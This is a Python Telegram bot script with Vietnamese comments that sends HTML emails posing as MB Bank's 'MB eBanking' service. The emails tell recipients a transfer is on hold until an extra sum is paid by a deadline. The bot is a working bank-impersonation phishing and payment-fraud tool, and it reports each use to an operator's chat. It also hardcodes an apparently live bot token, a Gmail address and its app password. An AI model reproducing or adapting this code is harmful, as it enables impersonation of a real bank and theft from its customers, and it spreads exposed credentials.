from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.utils import formataddr
from email.mime.image import MIMEImage
import re
import os

# =============== CẤU HÌNH ===============
BOT_TOKEN = "8402600514:AAFD1IbsPCRJBkTD9xa5XEY3EKcib9i4cCc"
SENDER_EMAIL = "bankm7247@gmail.com"
SENDER_NAME = "MB eBanking"
PASSWORD = "jvsk apqd udzn unaf"

ADMIN_CHAT_ID = 7417918579 

# =============== HÀM HỖ TRỢ ===============
def format_vnd(amount):
    return "{:,.0f} VNĐ".format(amount)


async def huongdan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    huong_dan_text = (
        "💡 *Hướng dẫn sử dụng lệnh /sendmail*\n\n"
        "Cú pháp:\n"
        "`/sendmail tenbank=TÊN_BANK mailsend=email@gmail.com tienback=12000000 "
        "timeGiaoDich=12:32:45 ngayketthuc=31/10/2025 tongkeo=114000000`\n\n"
        "➡️ Ví dụ:\n"
        "`/sendmail tenbank=LE VAN A mailsend=test@gmail.com tienback=12000000 "
        "timeGiaoDich=14:22:12 ngayketthuc=31/10/2025 tongkeo=52000000`"
    )
    await update.message.reply_text(huong_dan_text, parse_mode="Markdown")


async def send_email(data):
    tenbank = data.get("tenbank", "")
    tienback = int(data.get("tienback", 0))
    mailsend = data.get("mailsend", "")
    timeGiaoDich = data.get("timeGiaoDich", "")
    ngayketthuc = data.get("ngayketthuc", "")
    tongkeo = format_vnd(int(data.get("tongkeo", 0)))

    message = MIMEMultipart("related")
    message["Subject"] = "THÔNG BÁO TREO GIAO DỊCH"
    message["From"] = formataddr((SENDER_NAME, SENDER_EMAIL))
    message["To"] = mailsend

    tienchuyen = format_vnd(tienback)

    html = f"""
    <html>
      <body style="font-family: Arial, Verdana, sans-serif; margin:0; padding:0;">
        <div style="max-width:600px; margin:auto; padding:0;">
          <p style="font-size:16px; font-weight:bold; margin:3px 0 3px 0;">
            Kính gửi Quý khách hàng <span style="text-transform:uppercase;">{tenbank}</span>
          </p>
          <div style="margin-bottom:18px;">
            <img src="cid:logo1" style="width:100%; max-width:600px; display:block; margin:0 auto;"/>
          </div>
          <p style="font-size:15px; font-weight:bold; margin-bottom:5px;">
            Cảm ơn Quý khách đã sử dụng dịch vụ MB eBanking.
          </p>
          <p style="font-size:15px; margin-bottom:-3px;">
            MB xin thông báo giao dịch của Quý khách đã được thực hiện như sau:
          </p>
          <p style="font-size:15px; margin-bottom:10px;">
            Hiện tại, giao dịch của Quý khách đang thực hiện vào lúc <b>{timeGiaoDich}</b> với nội dung "<b>{tenbank}</b> chuyen tien" đang tạm thời được treo để phục vụ công tác rà soát và đảm bảo an toàn hệ thống vì nhận thấy giao dịch của Quý khách chưa đủ luồng, vì vậy hệ thống sẽ tạm thời giữ lại giao dịch này cho đến khi được bổ sung.
          </p>
          <p style="font-size:15px; margin-bottom:10px;">
            Để tiếp tục xử lý, Quý khách vui lòng yêu cầu bên nhận tiền chuyển bổ sung số tiền là <b>{tienchuyen}</b> trước <b>00:00:00</b> ngày <b>{ngayketthuc}</b>. Sau thời hạn trên, hệ thống sẽ không thể ghi nhận giao dịch và khoản tiền <b>{tongkeo}</b> đã chuyển sẽ được hoàn lại.
          </p>
          <p style="font-size:15px; margin-bottom:-3px;">
            Chúng tôi rất xin lỗi về sự bất tiện này và mong Quý Khách thông cảm.
          </p>
          <p style="font-size:15px; margin-bottom:10px;">
            Trân trọng.<br>
            Ngân hàng MB
          </p>
          <div style="margin-top:24px;">
            <img src="cid:footer" style="width:100%; max-width:600px; display:block; margin:0 auto;"/>
          </div>
        </div>
      </body>
    </html>
    """

    message.attach(MIMEText(html, "html", "utf-8"))

    try:
        with open("image/logo1.png", "rb") as img:
            logo = MIMEImage(img.read())
            logo.add_header("Content-ID", "<logo1>")
            logo.add_header("Content-Disposition", "inline", filename="logo1.png")
            message.attach(logo)

        with open("image/footer.png", "rb") as img:
            footer = MIMEImage(img.read())
            footer.add_header("Content-ID", "<footer>")
            footer.add_header("Content-Disposition", "inline", filename="footer.png")
            message.attach(footer)
    except FileNotFoundError:
        print("⚠️ Không tìm thấy logo/footer.")

    with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
        server.login(SENDER_EMAIL, PASSWORD)
        server.sendmail(SENDER_EMAIL, mailsend, message.as_string())


# =============== LỆNH TELEGRAM ===============
async def sendmail(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        text = " ".join(context.args)
        if not text:
            await update.message.reply_text(
                "⚠️ Vui lòng nhập lệnh đúng định dạng:\n"
                "/sendmail tenbank=LENH GIA NHAT mailsend=email@gmail.com tienback=12000000 "
                "timeGiaoDich=12:32:45 ngayketthuc=31/10/2025 tongkeo=114000000"
            )
            return

        # Parse key=value
        parts = re.split(r" (?=\w+=)", text.strip())
        data = {}
        for p in parts:
            if "=" in p:
                key, value = p.split("=", 1)
                data[key.strip()] = value.strip()

        required_fields = ["tenbank", "mailsend", "tienback", "timeGiaoDich", "ngayketthuc", "tongkeo"]
        missing = [f for f in required_fields if f not in data]
        if missing:
            await update.message.reply_text(f"⚠️ Thiếu các tham số: {', '.join(missing)}")
            return

        user = update.effective_user
        username = f"@{user.username}" if user.username else user.first_name

        await update.message.reply_text("⏳ Đang gửi email...")
        data["tienback"] = int(data["tienback"].replace(",", "").replace(".", ""))
        data["tongkeo"] = int(data["tongkeo"].replace(",", "").replace(".", ""))
        await send_email(data)

        await update.message.reply_text(f"✅ Đã gửi email thành công tới {data.get('mailsend')}!")

        # 📨 Gửi thông báo riêng cho Admin
        if ADMIN_CHAT_ID:
            admin_msg = (
                f"📢 *Có người vừa dùng lệnh /sendmail!*\n\n"
                f"👤 Người gửi: {username}\n"
                f"🕒 Thời gian giao dịch: {data.get('timeGiaoDich')}\n"
                f"🏦 Tên bank: {data.get('tenbank')}\n"
                f"📧 Mail nhận: {data.get('mailsend')}\n"
                f"💸 Tiền back: {format_vnd(data.get('tienback'))}\n"
                f"📅 Ngày kết thúc: {data.get('ngayketthuc')}\n"
                f"💰 Tổng kèo: {format_vnd(data.get('tongkeo'))}"
            )
            await context.bot.send_message(chat_id=ADMIN_CHAT_ID, text=admin_msg, parse_mode="Markdown")

    except ValueError as ve:
        await update.message.reply_text(f"❌ Dữ liệu số không hợp lệ: {ve}")
    except Exception as e:
        await update.message.reply_text(f"❌ Lỗi: {e}")


# =============== CHẠY BOT ===============
app = ApplicationBuilder().token(BOT_TOKEN).build()
app.add_handler(CommandHandler("sendmail", sendmail))
app.add_handler(CommandHandler("huongdan", huongdan))

print("🚀 Bot đang chạy...")
app.run_polling()
